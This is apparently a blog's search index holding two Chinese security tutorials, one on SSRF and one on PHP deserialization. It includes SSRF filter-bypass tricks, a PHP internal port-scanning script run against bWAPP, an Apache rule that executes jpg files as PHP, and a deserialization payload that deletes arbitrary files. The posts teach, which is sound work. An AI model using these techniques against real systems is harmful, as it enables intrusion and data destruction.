<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SSRF总结</title>
    <url>/2019/12/15/SSRF/</url>
    <content><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<a id="more"></a>

<h2 id="0x00-概念"><a href="#0x00-概念" class="headerlink" title="0x00 概念"></a>0x00 概念</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p>
<h2 id="0x01-可能出现的地方"><a href="#0x01-可能出现的地方" class="headerlink" title="0x01 可能出现的地方"></a>0x01 可能出现的地方</h2><p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
<p>3.在线翻译：给网址翻译对应网页的内容</p>
<p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
<p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
<p>8.数据库内置功能：数据库的比如<code>mongodb</code>的<code>copyDatabase</code>函数</p>
<p>9.邮件系统：比如接收邮件服务器地址</p>
<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
<p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
<p>12.从远程服务器请求资源（upload from url 如discuz!;  import &amp; expost rss feed 如web blog;  使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
<p>13.WebHooks：寻找触发特定事件时发出http请求的服务。在大多数WebHooks的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。</p>
<p>14.PDF生成器：试着注入指向内部服务的<code>&lt;iframe&gt;,&lt;img&gt;,&lt;base&gt;</code>或者<code>&lt;script&gt;</code>元素或者CSS的<code>url()</code>函数。</p>
<p>15.文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。</p>
<p>16.链接扩展: 最近<a href="https://twitter.com/BugBountyHQ/status/868242771617792000" target="_blank" rel="noopener">Mark Litchfield在推特扩展链接上发现了漏洞</a>，名声大涨。</p>
<p>17.文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。<a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">例子</a></p>
<h2 id="0x02-漏洞验证"><a href="#0x02-漏洞验证" class="headerlink" title="0x02 漏洞验证"></a>0x02 漏洞验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求。</p>
<p>比如：该资源地址类型为 <code>http://www.xxx.com/a.php?image=(地址)</code>的就可能存在SSRF漏洞。</p>
<p>2.dnslog等工具进行测试，看是否被访问。</p>
<ul>
<li>可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</li>
</ul>
<p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址。</p>
<ul>
<li><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p>
</li>
<li><p>通过二级域名暴力猜解工具模糊猜测内网地址。</p>
</li>
</ul>
<p>4.直接返回的Banner、title、content等信息。</p>
<p>5.留意bool型SSRF</p>
<h2 id="0x03-一些利用方式"><a href="#0x03-一些利用方式" class="headerlink" title="0x03 一些利用方式"></a>0x03 一些利用方式</h2><p>1.让服务端去访问相应的网址 比如在自己的服务器上监听端口然后在url让他去请求我们的服务器</p>
<p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p>
<p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p>
<p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p>
<p>5.攻击内网应用程序（利用跨协议通信技术）</p>
<p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p>
<p>某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。</p>
<h2 id="0x04-绕过小技巧"><a href="#0x04-绕过小技巧" class="headerlink" title="0x04 绕过小技巧"></a>0x04 绕过小技巧</h2><p>1.<a href="http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的" target="_blank" rel="noopener">http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的</a></p>
<p>2.各种IP地址的进制转换</p>
<p>3.URL跳转绕过：<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/" target="_blank" rel="noopener">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a></p>
<p>4.短网址绕过 <a href="http://t.cn/RwbLKDx" target="_blank" rel="noopener">http://t.cn/RwbLKDx</a></p>
<p>5.xip.io来绕过：<a href="http://192.168.0.1.xip.io/" target="_blank" rel="noopener">http://192.168.0.1.xip.io/</a> == 192.168.0.1 </p>
<p>6.限制了子网段，可以加 :80 端口绕过。<a href="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80" target="_blank" rel="noopener">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</a></p>
<p>7.探测内网域名，或者将自己的域名解析到内网ip</p>
<p>8.例如 <a href="http://10.153.138.81/ts.php" target="_blank" rel="noopener">http://10.153.138.81/ts.php</a> , 修复时容易出现的获取host时以/分割来确定host，</p>
<p>但这样可以用 <a href="http://abc@10.153.138.81/" target="_blank" rel="noopener">http://abc@10.153.138.81/</a> 绕过</p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2><p>1.禁止跳转</p>
<p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p>
<p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
<p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p>
<p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<h2 id="0x06-漏洞利用中牵涉的小技巧"><a href="#0x06-漏洞利用中牵涉的小技巧" class="headerlink" title="0x06 漏洞利用中牵涉的小技巧"></a>0x06 漏洞利用中牵涉的小技巧</h2><p>crontab -l 显示当前计划任务</p>
<p>crontab -r 清除当前计划任务</p>
<p>端口转发工具 socat</p>
<p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行</p>
<p>AddType application/x-httpd-php .jpg<br>……</p>
<p>常用的探测内网地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.0.0/8 127.0.0.1/32 172.16.0.0/12 192.168.0.0/16</span><br></pre></td></tr></table></figure>

<p>常用的探测端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21, 22, 23, 25, 53, 80, 110, 443, 1433, 3306, 3389, 8080, 8443</span><br></pre></td></tr></table></figure>

<h2 id="0x07-举一个栗子"><a href="#0x07-举一个栗子" class="headerlink" title="0x07 举一个栗子"></a>0x07 举一个栗子</h2><p>先说一下关于SSRF的<strong>函数</strong></p>
<p>curl造成的SSRF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure>

<p>file_get_contents造成的SSRF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">echo file_get_contents($url);</span><br></pre></td></tr></table></figure>
<p>fsockopen造成的SSRF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function Getfile($host, $port, $link)&#123;</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);</span><br><span class="line">    if(!$fp)&#123;</span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $out = &quot;GET $link HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out .= &quot;HOST $host \r\n&quot;;</span><br><span class="line">        $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">        $out .= &quot;\r\n&quot;;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $content = &apos;&apos;;</span><br><span class="line">        while(!feof($fp))&#123;</span><br><span class="line">            $contents .= fgets($fp, 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们直接使用docker搭建了Bwapp平台做测试 其实本地搭建php就可以</p>
<p>docker使用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search bwapp</span><br><span class="line">docker pull raesene/bwapp</span><br><span class="line">docker run -d -p 8080:80 raesene/bwapp</span><br></pre></td></tr></table></figure>

<p>这里我们选择文件包含测试 难度选择low 点击GO</p>
<p><img src="/images/SSRF/bwapp2.png" alt="html">    </p>
<p><img src="/images/SSRF/bwapp1.png" alt="html">    </p>
<p>这时候我们可以看到<code>language</code>参数的值是一个文件 这时候我们用内网探测脚本试一试</p>
<p><img src="/images/SSRF/bwapp3.png" alt="html">    </p>
<p>这里放出内网探测的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//list of port numbers to scan</span></span><br><span class="line">    $ports = <span class="keyword">array</span>(<span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">110</span>, <span class="number">1433</span>, <span class="number">3306</span>);</span><br><span class="line">    </span><br><span class="line">    $results = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>($ports <span class="keyword">as</span> $port)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($pf = @fsockopen($_REQUEST[<span class="string">"ip"</span>], $port, $err, $err_string, <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">true</span>;</span><br><span class="line">            fclose($pf);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            $results[$port] = <span class="keyword">false</span>;        </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span>($results <span class="keyword">as</span> $port=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $prot = getservbyport($port,<span class="string">"tcp"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Port $port ($prot): "</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($val)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:green\"&gt;OK&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;span style=\"color:red\"&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实这里是有一个坑的 网上的一些教程说是在bwapp里选择ssrf会提供三个脚本 但是我去docker里找了根本没有这个文件夹 然后又去github上找了这个docker的文件 发现也没有emmm 最后在github上搜到了这个脚本 我把链接贴出来<a href="https://github.com/theand-fork/bwapp-code" target="_blank" rel="noopener">Bwapp 的POC</a></p>
<p>Redis getshll留坑 原先写过 找不到了等重新加到后面吧。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>漏洞挖掘</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化与反序列化</title>
    <url>/2019/12/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>漏洞：通常情况下不影响软件的正常功能，但如果被攻击者利用，有可能驱使软件去执行一些额外的恶意代码，从而引发</p>
<p>内存中的数据对象只有转换成二进制才可以进行数据持久化和网络传输。将数据对象转换成二进制的流程称之为对象的序列化（Serialization）。反之，将二进制流恢复为数据对象的过程称之为反序列化（Deserialization）。序列化需要保留充分的信息以恢复数据对象，但是为了节省存储空间和网络带宽，序列化后的二进制流又要尽可能的小。</p>
<a id="more"></a>

<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="0x00-PHP反序列化原理"><a href="#0x00-PHP反序列化原理" class="headerlink" title="0x00 PHP反序列化原理"></a>0x00 PHP反序列化原理</h2><h3 id="1-PHP序列化与反序列化基础"><a href="#1-PHP序列化与反序列化基础" class="headerlink" title="1.PHP序列化与反序列化基础"></a>1.PHP序列化与反序列化基础</h3><h4 id="1-1-序列化与反序列化"><a href="#1-1-序列化与反序列化" class="headerlink" title="1.1 序列化与反序列化"></a>1.1 序列化与反序列化</h4><p>序列化是将变量转换为可保存或传输字符串的过程。</p>
<p>反序列化就是在适当的时候把这个字符串再转化为原来的变量使用。</p>
<h4 id="1-2PHP序列化与反序列化函数"><a href="#1-2PHP序列化与反序列化函数" class="headerlink" title="1.2PHP序列化与反序列化函数"></a>1.2PHP序列化与反序列化函数</h4><p>Serialize：可以将变量转换为字符串并且在转换中可以保存当前变量的值。</p>
<p>unserialize：可以将Serialize生成的字符串变换回变量。</p>
<p>php进行序列化的目的是保存一个对象方便以后重用。</p>
<h3 id="2-类，变量，方法，对象"><a href="#2-类，变量，方法，对象" class="headerlink" title="2.类，变量，方法，对象"></a>2.类，变量，方法，对象</h3><p>举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建Person类 </span></span><br><span class="line"><span class="comment">变量为name和age </span></span><br><span class="line"><span class="comment">方法为Information</span></span><br><span class="line"><span class="comment">对象为$per</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	$per = <span class="keyword">new</span> Person();</span><br><span class="line">	$per -&gt; name = <span class="string">'melon'</span>;</span><br><span class="line">	$per -&gt; age = <span class="number">18</span>;</span><br><span class="line">	$per -&gt; Information();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person1.png" alt="html">    </p>
<h3 id="3-php序列化实例"><a href="#3-php序列化实例" class="headerlink" title="3.php序列化实例"></a>3.php序列化实例</h3><p>serialize()</p>
<p>序列化一个对象将会保存对象的所有变量。但是不会保存对象的方法，只会保存类的名字。</p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建Person类 </span></span><br><span class="line"><span class="comment">变量为name和age </span></span><br><span class="line"><span class="comment">方法为Information</span></span><br><span class="line"><span class="comment">对象为$per</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	$per = <span class="keyword">new</span> Person();</span><br><span class="line">	$per -&gt; name = <span class="string">'melon'</span>;</span><br><span class="line">	$per -&gt; age = <span class="number">18</span>;</span><br><span class="line">	<span class="keyword">echo</span> serialize($per);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person2.png" alt="html">    </p>
<h3 id="3-php反序列化实例"><a href="#3-php反序列化实例" class="headerlink" title="3.php反序列化实例"></a>3.php反序列化实例</h3><p>unserialize()</p>
<p>unserialize()一个对象，这个对象的类必须已经定义过。</p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">创建Person类 </span></span><br><span class="line"><span class="comment">变量为name和age </span></span><br><span class="line"><span class="comment">方法为Information</span></span><br><span class="line"><span class="comment">对象为$per</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> unserialize(<span class="string">'O:6:"Person":2:&#123;s:4:"name";s:5:"melon";s:3:"age";i:18;&#125;'</span>);</span><br><span class="line">	$per -&gt; Information();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person3.png" alt="html">    </p>
<h3 id="4-php魔法函数"><a href="#4-php魔法函数" class="headerlink" title="4.php魔法函数"></a>4.php魔法函数</h3><p>php类中包含了一些魔法函数，这些函数可以在脚本的任何地方不用声明就可以使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">		php魔法函数 魔法函数可以在脚本的任何地方不用声明就可以使用</span><br><span class="line">		与php（反）   序列化有关的魔法函数   					</span><br><span class="line">		_construct() 当一个对象被创建时调用				   </span><br><span class="line">		__destruct() 当对象被销毁时						 </span><br><span class="line">		__wakeup()	 使用unserialize						 </span><br><span class="line">		__sleep()	 使用serialize时触发</span><br><span class="line">		__toSting()	 把类当作字符串使用时触发</span><br><span class="line">		__get()		用于从不可访问的属性读取数据</span><br><span class="line">		__set()  	用于数据写入不可访问的属性时</span><br><span class="line">		__isset()  	在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">		__unset()	在不可访问的属性上使用unset()时触发</span><br><span class="line">		__invoke()	当脚本尝试将对象调用为函数时触发</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h3 id="5-魔法函数举一个例子"><a href="#5-魔法函数举一个例子" class="headerlink" title="5.魔法函数举一个例子"></a>5.魔法函数举一个例子</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' is '</span>.<span class="keyword">$this</span>-&gt;age . <span class="string">'years old .&lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在类里创建三个魔法函数测试</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'I am __toString &lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'I am __construct &lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'I am __destruct &lt;br/&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$per = <span class="keyword">new</span> Person();       <span class="comment">//创建类执行 __construct</span></span><br><span class="line">	$per -&gt; name = <span class="string">'melon'</span>;</span><br><span class="line">	$per -&gt; age =<span class="number">18</span>;</span><br><span class="line">	<span class="keyword">echo</span> $per;				  <span class="comment">//把类当字符串打印 执行__toString 然后类被销毁 执行 __destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Person4.png" alt="html">    </p>
<h3 id="6-反序列化漏洞"><a href="#6-反序列化漏洞" class="headerlink" title="6.反序列化漏洞"></a>6.反序列化漏洞</h3><p>php反序列化漏洞又称对象注入可能会导致注入，远程代码执行等安全问题的发生。</p>
<p>php反序列化漏洞如何产生：如果一个php代码中使用了unserialize函数去调用某一类，该类中会自动执行一些自定义函数的magic method，这些magic method中如果包含了一些危险操作，或者这些magic method会去调用类中其他带有危险操作的函数，如果这些危险操作是我们可控的，那么就可以进行一些危害操作甚至getshell。</p>
<h2 id="0x01-PHP反序列化Demo"><a href="#0x01-PHP反序列化Demo" class="headerlink" title="0x01 PHP反序列化Demo"></a>0x01 PHP反序列化Demo</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//delete.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">delete</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'error'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;filename.<span class="string">'was deleted &lt;br/&gt;'</span>;</span><br><span class="line">        unlink(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在代码中可以看到，delete类中定义了一个__destruct()函数，该函数中会执行删除文件操作。如果我们想利用该类来执行任意文件删除操作，则需要找一个可控的unserialize()函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Person.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Delete.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">'is'</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">'years old&lt;br/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$per = unserialize($_REQUEST[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>漏洞成因：我们的Person.php文件包含了Delete.php 要想达到任意文件删除的目的就需要控制传入的文件名 而文件名参数是$filename 那怎样控制filename变量就是我们的目的 首先我们知道<code>__destruct</code>魔法函数 是对象销毁的时候执行的 当对Person传一个参数file是 对象销毁 执行魔法函数删除文件操作 因为对传入参数做了反序列化处理所以我们构造一个序列化对象 其中我们构造的对象中filename的值要覆盖掉Delete.php中filename的值来达到删除任意文件的目的。</p>
<p>构造POC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">delete</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'error'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$melon = <span class="keyword">new</span> delete();</span><br><span class="line">$melon-&gt;filename=<span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($melon);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对Person.php发起请求：<code>file=O:6:&quot;delete&quot;:1:{s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/rmfile.png" alt="html">    </p>
<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/flag.png" alt="html">    </p>
<h2 id="0x02-关于PHP反序列化的题目"><a href="#0x02-关于PHP反序列化的题目" class="headerlink" title="0x02 关于PHP反序列化的题目"></a>0x02 关于PHP反序列化的题目</h2><p>代码入下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//查找file文件中的字符串，如果有'\\'和'/'在字符串中，就显示错误</span></span><br><span class="line">            <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  